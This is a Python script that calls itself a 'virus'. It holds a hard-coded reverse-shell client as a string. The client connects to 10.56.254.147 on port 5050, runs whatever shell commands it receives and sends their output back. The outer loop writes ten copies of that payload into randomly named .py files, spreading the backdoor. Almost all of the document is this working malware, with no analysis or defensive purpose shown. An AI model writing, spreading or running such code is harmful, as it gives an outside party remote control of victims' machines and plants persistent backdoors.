import random, os, time

file='''import subprocess
import socket, os

HEADER = 64
PORT = 5050
FORMAT = 'utf-8'
DISCONNECT_MESSAGE = "!DISCONNECT"
SERVER = "10.56.254.147"
ADDR = (SERVER, PORT)
connected = True

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m' 
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(ADDR)

def send(msg):
    try:
      message = msg.encode(FORMAT)
    except:
      message = msg
    msg_length = len(message)
    send_length = str(msg_length).encode(FORMAT)
    send_length += b' ' * (HEADER - len(send_length))
    client.send(send_length)
    try:
      client.send(bytes(message))
    except:
      client.send(message)
while True:
  try:
    bashCommand = client.recv(2048).decode(FORMAT)

    #print('1')
    proc = subprocess.Popen([bashCommand], stdout=subprocess.PIPE, shell=True)
    #print('2')
    (out, err) = proc.communicate()
    #print('3')

    send(out)
    #print('4')
    send(f'{bcolors.OKGREEN}[OK] command ran{bcolors.ENDC}')
  except:
    send(f'{bcolors.FAIL}[ERROR] Unable to run command{bcolors.ENDC}')

  

send(DISCONNECT_MESSAGE)


'''


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m' 
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    
letters=['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']
#repeats 10 times
for i in str(1234567890):
  filename = []
  #repeats 10 times
  for j in str(1234567890):
    letter = random.randrange(0,25)
    filename.append(letters[letter])
    
  #print(filename)
  finalFilename = filename[0] + filename[1] + filename[2] + filename[3] + filename[4] + filename[5] + filename[6] + filename[7] + filename[8] + filename[9] + '.py'
  f = open(finalFilename, 'a')
  f.write(file)
  f.close()
  print(f'{bcolors.OKCYAN}[DUPLICATED] Duplicated virus{bcolors.ENDC}')
  print(f'{bcolors.OKBLUE}[DEBUG] Made new file: {filename}{bcolors.ENDC}')
  print()

